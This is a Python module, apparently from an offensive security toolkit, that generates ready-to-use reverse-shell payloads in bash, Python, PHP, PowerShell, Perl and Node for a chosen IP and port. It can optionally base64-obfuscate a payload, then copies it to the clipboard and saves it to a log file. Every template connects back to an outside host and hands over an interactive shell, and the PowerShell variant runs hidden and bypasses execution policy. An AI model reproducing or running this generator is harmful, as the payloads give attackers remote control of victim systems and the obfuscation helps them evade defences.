# modules/phase5/reverse_shell_gen.py

import base64
import platform
import os

def generate_reverse_shell(ip, port, lang="bash", obfuscate=False):
    if lang == "auto":
        if platform.system().lower().startswith("win"):
            lang = "powershell"
        else:
            lang = "bash"

    shells = {
        "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "python": f"python -c 'import socket,subprocess,os;"
                  f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                  f"s.connect((\"{ip}\",{port}));"
                  f"os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
                  f"import pty; pty.spawn(\"/bin/bash\")'",
        "php": f"php -r '$sock=fsockopen(\"{ip}\",{port});"
               f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
                      f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
                      f"$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};"
                      f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;"
                      f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
                      f"$sendback = (iex $data 2>&1 | Out-String );"
                      f"$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';"
                      f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
                      f"$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}",
        "perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};"
                f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{"
                f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
                f"exec(\"/bin/sh -i\");}};'",
        "node": f"require('child_process').exec('bash -i >& /dev/tcp/{ip}/{port} 0>&1')"
    }

    if lang not in shells:
        print(f"[❌] Language '{lang}' not supported.")
        return None

    shell = shells[lang]

    if obfuscate:
        encoded = base64.b64encode(shell.encode()).decode()
        if lang in ["bash", "python", "php"]:
            shell = f"echo {encoded} | base64 -d | bash"
        elif lang == "powershell":
            shell = f"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{encoded}')) | iex"

    print("\n[🧠] Payload Generated:")
    print("=" * 50)
    print(shell)
    print("=" * 50)

    # ✅ Clipboard Copy
    try:
        import pyperclip
        pyperclip.copy(shell)
        print("[📋] Payload copied to clipboard!")
    except ImportError:
        print("[⚠️] pyperclip not installed. Clipboard copy skipped.")

    # ✅ Save to file
    try:
        os.makedirs("logs/phase5", exist_ok=True)
        filename = f"logs/phase5/shell_{lang}_{ip}_{port}.txt"
        with open(filename, "w") as f:
            f.write(shell)
        print(f"[💾] Payload saved to {filename}")
    except Exception as e:
        print(f"[⚠️] Failed to save payload: {e}")

    return shell
